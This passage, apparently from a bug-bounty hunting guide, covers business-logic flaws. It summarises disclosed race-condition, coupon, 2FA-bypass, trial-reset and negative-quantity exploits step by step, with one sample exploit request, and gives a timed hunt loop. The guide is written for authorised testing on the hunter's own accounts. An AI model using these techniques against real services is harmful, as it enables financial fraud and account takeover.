3. **Reproducibility in 10 minutes.** Burp Repeater session export OR curl one-liner that demonstrates the chain. For race conditions, document the parallel-execution method (Burp tab group, asyncio script, threading).

4. **Scope check.** Asset in scope. Test against your OWN second account (not real customers). Re-test before submission — business-logic patches are often single-line code changes, fixed within hours of report submission.

5. **PoC artifacts** — 30-60 second screen recording showing the chain end-to-end (asciinema or mp4 — no edits hiding intermediate state). Burp request/response screenshots with non-sensitive data. For race conditions, include timing diagram showing concurrent request alignment. Subsequent-GET screenshots proving the unauthorized state change persists.

If any of the 5 fails: **stop**. You have a finding, not a report. Common kills:

- "Negative quantity accepted" without showing the order completes — informational
- "Race condition theoretically possible" without actually triggering — N/A
- "Coupon applied twice" without showing reduced cart total — low-impact
- "2FA bypass" without confirming the final-state authenticated session — needs proof

## Top-Tier Hunter Decision Engine

Business-logic hunting is not "try weird values everywhere"; it is invariant testing. For every target, write the invariant in one sentence before touching Burp: "a coupon can be consumed once", "a wallet debit and credit preserve total balance", "a trial can be granted once per billing identity", "a phone-number change proves control of old and new numbers". The report is strong only when you show that invariant broken in final server state.

**Stop in 15 minutes** when the manipulated field is display-only, the final GET shows canonical state unchanged, the program excludes the abuse class, or the impact is below noise threshold. **Keep chaining** when the broken invariant reaches money, subscription tier, MFA, ownership, inventory, or account recovery. **Report immediately** when you can quantify dollars, inventory count, account takeover, or durable privilege; do not spend extra time turning a clean financial-integrity bug into unauthorized data access.

**Minimum proof ceiling:** use your own two accounts, your own payment method, test-mode cards, or a clearly reversible sandbox object. For money flows, show before/after ledger totals and stop before real withdrawal. For ATO flows, take over your second account only. For race bugs, preserve request timestamps and server-state screenshots; the triager needs to see concurrency, not just a surprising final value.

## Real Impact Examples

**Example 1 — `wwbn-avideo-wallet-toctou-balance-creation-from-nothing` (low five-figure bounty range, 1-link TOCTOU primitive — CVE-2026-34368 NVD-verified, GHSA-h54m-c522-h6qr)**
- Setup: WWBN AVideo video-CMS platform with YPTWallet plugin enabled. Wallet supports user-to-user transfers via `transferBalance()` method in `plugin/YPTWallet/YPTWallet.php`. Authenticated users can transfer funds to other users. Captcha required per transfer (`$_SESSION['palavra']` validation).
- Discovery: Researcher analyzed wallet plugin source code on GitHub. Identified read-check-write pattern in `transferBalance()`: SELECT current balance → PHP-side check sufficiency → UPDATE deducted balance. No `BEGIN TRANSACTION`, no `SELECT ... FOR UPDATE`, no row-level locking. Secondary defect: captcha token not unset after validation, enabling reuse within same session.
- Exploitation: Attacker logged in with two PHP sessions (two PHPSESSID cookies for same user account). Generated one captcha, captured the validated token. Sent 20 concurrent transfer requests via Python threading with same captcha token. All 20 requests entered `transferBalance()` in parallel; all read sender_balance=$10, all passed check (10 >= 10 transfer amount), only 1 deduction effective (last writer wins for sender), recipient credited 20× = $200.
- Impact: Wallet balance creation from nothing — $10 starting balance produces $200 in recipient wallet. Inflated balance bypasses pay-per-view charges, subscription fees, paid-feature gates. Financial integrity compromised — total balances across all users no longer match total deposits.
- Disclosed source: GHSA-h54m-c522-h6qr (WWBN/AVideo, 2026 critical) at https://github.com/WWBN/AVideo/security/advisories/GHSA-h54m-c522-h6qr; CVE-2026-34368 (NVD-verified, CVSS 5.3 medium per NVD though impact-class is critical) at https://nvd.nist.gov/vuln/detail/CVE-2026-34368; CVEReports analysis at https://cvereports.com/reports/CVE-2026-34368. Affects WWBN AVideo through 26.0; fix in commit `34132ad5159784bfc7ba0d7634bb5c79b769202d`.

**Example 2 — `lilishop-coupon-overpurchase-concurrent-collection` (low five-figure bounty range on programs that triage as financial-fraud-class — CVE-2024-50654 NVD-verified, CVSS 7.5)**
- Setup: Lilishop e-commerce platform v4.2.4 and earlier. Coupon collection feature with per-user / per-coupon quantity limit enforced server-side.
- Discovery: Researcher Yllxx03 identified Incorrect Access Control in coupon collection logic. Limit check happens before atomic decrement of available_count.
- Exploitation: Captured coupon-collection HTTP request via proxy. Replayed in high concurrency (Burp Suite Repeater Parallel Execution / custom script). All concurrent requests passed the limit check before any committed the decrement; attacker collected coupons beyond the enforced quantity limit.
- Impact: Attackers obtain unlimited coupons per user (intended limit: 1 or 5 per user; attacker collects N). Direct e-commerce financial loss when these coupons are redeemed at checkout.
- Disclosed source: CVE-2024-50654 (NVD-verified CVSS 7.5 HIGH, published Nov 15 2024) at https://cvefeed.io/vuln/detail/CVE-2024-50654; original analysis at https://github.com/Yllxx03/CVE/blob/main/lilishop/CouponLogicVulnerability.md; affects Pickmall lilishop through version 4.2.4.

**Example 3 — `samsung-account-2fa-bypass-via-imei-leak` (low five-figure bounty range from Samsung Security Bounty program, 2-link chain — Gregory Greekas Dec 2024 disclosure)**
- Setup: Samsung Account global 2FA system. 2FA request API endpoint accessible without authentication. Trusted-device verification uses `deviceUniqueId` field derived deterministically from device IMEI through known transformation. Username (publicly-discoverable) → 2FA request API → exposes IMEI.
- Discovery: Gregory Greekas during account-security review identified the 2FA-request endpoint disclosed sensitive device info (IMEIs, phone numbers) to anyone with a victim's username. No authentication required for the leak. Reverse-engineered the deviceUniqueId derivation to confirm IMEI → deviceUniqueId is deterministic.
- Exploitation: Step 1: query 2FA-request API with victim's username → response contains IMEI. Step 2: compute expected deviceUniqueId from IMEI via known transformation. Step 3: include computed deviceUniqueId in authentication request → authenticate as if using victim's trusted device → 2FA bypassed entirely. Final result: full session tokens (AccessToken, UserAuthToken, RefreshToken) for victim account, with only the victim's password required.
- Impact: 2FA fundamentally undermined — security model meant to protect when password is compromised was nullified. Globally affected Samsung Account and Samsung Cloud. Scalable to any account count with just usernames.
- Disclosed source: Gregory Greekas blog post at https://www.hackingadventures.ca/posts/samsung-2fa-bypass; Samsung paid cash bounty (specific amount not publicly disclosed; high-severity tier). Samsung patched December 2024. No CVE assigned (typical for auth-bypass on consumer cloud services).

**Example 4 — `doppler-free-trial-reset-via-plan-tier-roundtrip` (mid four-figure bounty range on SaaS programs that pay this class — Aditya Sunny Dec 2024 disclosure)**
- Setup: Doppler secrets-management platform with 14-day Team Mode (premium) free trial. Free Developer Mode tier exists for indefinite use of basic features. Subscription tier-switching is a single API call.
- Discovery: Aditya Sunny tested trial-cancellation flow expecting trial-state to persist as "consumed". Tested switching to Developer Mode (free tier) after trial cancellation. Then tested switching BACK to Team Mode — found trial regranted.
- Exploitation: Sign up for new account → activate 14-day Team Mode trial → cancel before trial expiry → switch to free Developer Mode → use developer tools / specific workflow to revert to Team Mode → trial restored without payment validation. Repeat indefinitely.
- Impact: Direct revenue loss for Doppler — users can use premium features perpetually without payment. Brand impact on paying customers who discover non-paying users have same access.
- Disclosed source: Aditya Sunny disclosure at https://adityasunny06.medium.com/how-i-identified-a-revenue-loss-bug-in-dopplers-free-trial-system-b88919aa161f (responsible disclosure to Doppler Nov 14 2024). Specific bounty amount not disclosed; pattern is mid four-figure on SaaS programs that triage trial-abuse as paying class. Many SaaS programs explicitly exclude this class — check scope per Cremit Apr 2026 analysis at https://www.cremit.io/blog/out-of-scope-loophole-credential-exposure.

**Example 5 — `alegrocart-negative-quantity-price-manipulation` (mid four-figure bounty range on equivalent commercial e-commerce — Andrey Stoykov Apr 2025 disclosure)**
- Setup: AlegroCart 1.2.9 e-commerce platform. Add-to-cart endpoint accepts quantity parameter from URL. Cart subtotal computed as sum of `quantity × unit_price` per line item.
- Discovery: Andrey Stoykov tested add-to-cart with negative quantity values via URL manipulation: `GET /alegrocart/index.php?controller=addtocart&action=add&item=10&quantity=-100 HTTP/1.1`. Server processed the negative quantity literally; cart line item showed `-100 x Featured-product $-1,599.00`.
- Exploitation: Add legitimate $50 product (positive quantity) to cart. Add high-value product with `quantity=-100` to cart → subtotal becomes negative. Proceed to checkout → checkout flow accepts negative total. Some payment integrations process this as a refund; others process as a $0 free order.
- Impact: Free orders or refund-without-purchase exploitation of e-commerce sites running AlegroCart. Equivalent pattern affects Bagisto v2.3.6 (Rudransh Singh Rajpurohit Sep 2025 disclosed) and many other CMS-driven e-commerce platforms.
- Disclosed source: Andrey Stoykov SecLists Full Disclosure post at https://seclists.org/fulldisclosure/2025/Apr/22 (April 23 2025); related Bagisto disclosure by Rudransh Singh Rajpurohit at https://medium.com/@rudranshsinghrajpurohit/cve-2025-56426-cart-price-manipulation-vulnerability-in-bagisto-cms-468b72311969; canonical pattern documentation at https://bugbounty.info/Attack-Surface/Web/Business-Logic/Price-Manipulation. Bounty range mid four-figure on equivalent commercial e-commerce (the original AlegroCart disclosure was OSS, no bounty).

**Example 6 — `better-auth-stripe-hasevertried-incomplete-subscription-reset` (mid four-figure bounty range on SaaS programs that pay trial-abuse — better-auth issue #6863 Dec 2025)**
- Setup: SaaS application uses better-auth's Stripe plugin for subscription state. Business rule: one free trial per billing identity. Plugin stores subscription records and computes `hasEverTrialed` from the first subscription object returned by database lookup.
- Discovery: Issue #6863 showed `findOne` can return a newly-created incomplete subscription before an older used-trial subscription. The app asks "has this user ever trialed?" and receives false because it inspected the wrong row.
- Exploitation: User starts a trial, cancels, then triggers a new checkout session that creates an incomplete subscription row. The next trial-eligibility check reads the incomplete row first, treats the user as trial-naive, and grants another free trial. Repeating the flow yields indefinite paid-tier access without payment.
- Impact: Direct SaaS revenue loss and fairness break for paying customers. In a team product, one attacker can repeatedly mint trial workspaces and invite users who should require paid seats.
- Disclosed source: better-auth GitHub issue #6863 (Dec 2025) at https://github.com/better-auth/better-auth/issues/6863; Stripe subscription-state integration pattern. Bounty range mid four-figure on equivalent commercial SaaS when the program pays subscription-abuse findings; trial-abuse exclusions are common, so scope acceptance is mandatory.

## Anti-Targets / What's Dead

The kill-list. Where NOT to point the cannon.

- **"I can apply a coupon twice"** — won't pay if second application doesn't actually reduce the cart total. Don't submit unless you show measurable financial impact. Stop reporting bare repeat-call findings.
- **"Race condition theoretically possible"** — N/A on most programs without proof of exploit. Don't submit "this endpoint reads-then-writes without lock" as a finding; you need to actually trigger the race and show the resulting state inconsistency.
- **Generic "negative quantity accepted in cart"** — informational unless the order actually completes with the negative total reflected. Stop submitting without checkout-completion proof.
- **Self-trial-abuse on programs that explicitly exclude this class** — check scope first. Cremit Apr 2026 documents that several major programs explicitly exclude credential-exposure and trial-abuse findings. Won't pay if it's documented out-of-scope.
- **2FA bypass on programs where 2FA is optional/recommended (not enforced)** — informational only. Programs that don't enforce 2FA company-wide treat 2FA-bypass as "user can choose to set 2FA, you bypassed an optional feature" and downgrade. Stop reporting unless the program markets 2FA as a security guarantee.
- **Email alias trial abuse without scaled proof** — informational at small scale (every dev knows about +aliases). Don't submit "I created 5 trials" — submit only with 1000+ scaled abuse demonstration showing measurable resource cost.
- **Refund flow accepting client refund_amount without testing server-side validation** — N/A unless you confirm the server actually issues the inflated refund. Many refund flows show client-supplied amount in UI but server processes from original transaction. Don't submit "I sent refund_amount=999" without showing the refund posted.
- **Currency-conversion rounding when difference is sub-cent** — won't pay because impact is rounding-error noise. Don't submit unless you can demonstrate accumulated impact at scale (1000 transactions × $0.01 = $10 measurable loss).
- **"I can edit my own account's tier field via mass-assignment"** — verify the change PERSISTS and grants paid features. Don't submit response-only changes that don't survive a refresh; many APIs return modified body but don't persist.
- **OAuth flow weirdness without ATO proof** — N/A if you can't show full account takeover. Stop reporting "OAuth doesn't validate state parameter" without the chain to ATO.
- **Workflow-step skipping that lands at validated state** — N/A if the final state is internally consistent (e.g., "I skipped email verification but the app still requires verification before any sensitive action"). Skipping intermediate steps is informational; bypassing the FINAL gate is paying.
- **Free shipping coupon stacking that's already in scope (vendor knows users do this)** — won't pay; documented as accepted business risk. Stop reporting on programs that explicitly mention free-shipping abuse in their scope/policy.
- **"I created multiple accounts and the app didn't stop me"** — N/A unless those accounts cause measurable resource cost or business-logic abuse. Multiple accounts alone is informational.
- **"Logic error in OAuth scope" without specific paid-feature impact** — informational. Don't submit until you map "scope X grants access to feature Y which costs $Z".
- **Timezone-based trial extension by < 24 hours** — won't pay; below noise threshold for most programs. Stop submitting unless you can extend by weeks or months.
- **Decimal-precision exploits at sub-cent level** — N/A; rounding noise. Same as currency-conversion issue above.

## Notes for the hunter

**24-month meta call-out.** The defining 2024-2026 business-logic story is **race-condition exploitation of payment / wallet / coupon flows** — WWBN AVideo CVE-2026-34368 wallet TOCTOU, Lilishop CVE-2024-50654 coupon overpurchase, Aditya Bhatt May 2025 InfoSec writeup applying coupons via Burp parallel execution, OpenCart Dec 2025 KhanMarshaI checkout race. If you hunt one new business-logic primitive next quarter, it's running every state-mutating endpoint through Burp Repeater Parallel Execution to find race windows. The second-place meta is **2FA bypass via auxiliary flows** — Keycloak CVE-2025-3910, KhaledAhmed107 Jan 2026 password-reset Skip pattern, Samsung Account 2FA bypass via IMEI leak. The third-place meta is **subscription / trial-state manipulation** — Doppler reset, email-alias abuse, Stripe `hasEverTrialed` better-auth #6863. The fourth-place meta is **price/quantity manipulation** — AlegroCart, Bagisto, generic negative-value exploits.

**OSS targets where the next 6 months of paying bugs likely are.** E-commerce CMS (Bagisto, Lilishop, AlegroCart, OpenCart, Magento extensions). Self-hosted SaaS with subscription / trial logic (Sentry, Plausible, Umami self-hosted, Outline). Wallet / payment / financial OSS (WWBN AVideo wallet plugin, BTCPay Server, Mempool.space). Identity / auth platforms (Keycloak, Authentik, Authelia, ZITADEL — see CVE-2025-3910 family). Multi-tier / freemium SaaS where subscription state determines feature access. Anywhere with promo / referral / invite-bonus / loyalty-points logic.

**Anti-patterns reminder.** See the Anti-Targets section above. Most-common kills: "race condition theoretically possible" without proof, negative quantity without checkout-completion proof, 2FA bypass on programs that don't enforce 2FA, multiple-accounts without measurable resource cost, refund-amount manipulation without server-side issued-refund proof.

**Ground rule for impact in 2026:** business-logic flaws pay 2-10× more when chained to direct financial impact (free orders, free subscriptions, refund larger than purchase, ATO via 2FA bypass). Always quantify in dollars: "free $500 jacket × 100 stock = $50K inventory loss" beats "negative quantity accepted". Always demonstrate the COMPLETED unauthorized state via subsequent GET; many findings get downgraded because the response shows success but the actual state didn't change.

**Currency tip:** ~6 of the verified CVEs/GHSAs cited in this skill are from 2024-2026; many business-logic findings (Doppler, Samsung, AlegroCart, KhaledAhmed107) don't have CVEs because vendors don't assign CVEs for application-specific findings. Re-verify with `verify_citations.py` before finalizing any report citing them.

## Top-Tier Operating Manual

**90-minute hunt loop**
1. 0-10 min: map one complete business flow end to end. Pick exactly one: checkout, refund, wallet transfer, trial lifecycle, phone change, MFA reset, account migration, referral payout, inventory reservation. Write the invariant before testing.
2. 10-25 min: capture every request in the flow and mark state writers. Highlight `price`, `quantity`, `discount`, `currency`, `tier`, `role`, `trial`, `coupon`, `wallet`, `stock`, `phone`, `otp`, `step`, and `idempotency` fields.
3. 25-50 min: run mutation tests only against fields that affect final state. Use negative, zero, max-int, duplicate coupon, duplicate step, stale step token, old session, and body-vs-path mismatch.
4. 50-70 min: run concurrency tests with last-byte sync on the highest-value writer. Target balance update, coupon consumption, inventory decrement, token redemption, trial grant, and refund issuance.
5. 70-85 min: chain only if the broken invariant reaches money, access, ownership, or account recovery. Convert "odd behavior" into a persisted unauthorized final state.
6. 85-90 min: report or kill. If a subsequent GET does not show durable impact, kill it.

**Decision tree**
- If the server recalculates the value and ignores your modified field, stop.
- If the modified value survives a refresh but grants no paid feature, chain to the paid-feature gate.
- If a race wins once, repeat with 5, 20, and 50 parallel requests to prove the window is real.
- If the race creates value or duplicate entitlement, report immediately with before/after ledger proof.
- If a workflow step can be skipped, test the final sensitive action. Only final-gate bypass pays.
- If an MFA/phone/email flow trusts a new factor only, use your own second account and prove takeover.

**False-positive graveyard**
- Response-only success: API echoes your modified tier but the database did not change. Kill unless a later GET confirms.
- Cart-only manipulation: cart total changes but checkout recalculates. Kill unless order completes.
- Coupon UI glitch: coupon appears twice but discount applies once. Kill unless final total changes.
- Race-looking logs: two requests overlap but one rolls back. Kill unless final state is inconsistent.
- Trial abuse without cost: free tier already grants the feature. Kill unless paid-tier resource is accessed.
- Business rule disagreement: "I think users should not do this" is not impact. Tie it to money, access, ownership, or compliance.

**Program economics**
- Fintech, marketplaces, ticketing, travel, gaming economies, and paid SaaS convert logic bugs into high severity fastest.
- Trial abuse, coupon abuse, and multi-account abuse are scope-sensitive. Check policy before testing at scale.
- ATO via MFA/phone/recovery bypass usually outranks pure financial abuse.
- Inventory exhaustion pays when scarcity is real: tickets, limited drops, bookings, ad credits, creator payouts.
- Sub-cent rounding and one-day trial extensions are noise unless you prove scale with math and a safe simulation.

**Report framing**
- Weak: "The coupon can be applied multiple times."
- Strong: "The server violates the one-use coupon invariant under concurrent redemption. Twenty parallel requests produce a persisted $495 unauthorized discount on a $500 cart. The attached subsequent GET proves the final payable total remains $5."
- Expected pushback: "This is abuse of intended functionality." Rebuttal: "The UI and terms enforce one coupon per order; the server-side ledger violates that invariant under concurrency."
- Expected pushback: "This requires many requests." Rebuttal: "The exploit uses a single last-byte-sync burst and completes in under one second."
- Expected pushback: "No real payment was completed." Rebuttal: "I used the program's sandbox/test payment path and stopped before real settlement; the server-generated order object shows the unauthorized amount."

**Automation harness**
- Build a `flow.yaml` per target with named requests: `start`, `mutate`, `commit`, `verify`.
- Store baseline and mutated responses side by side; diff only final-state fields.
- For races, use Turbo Intruder or an asyncio script with a barrier, then run a verifier request after every burst.
- Keep a ledger table: before balance, request count, expected final state, actual final state, delta, screenshot path.
- Never automate against real customer objects. Seed your own objects and make cleanup part of the harness.
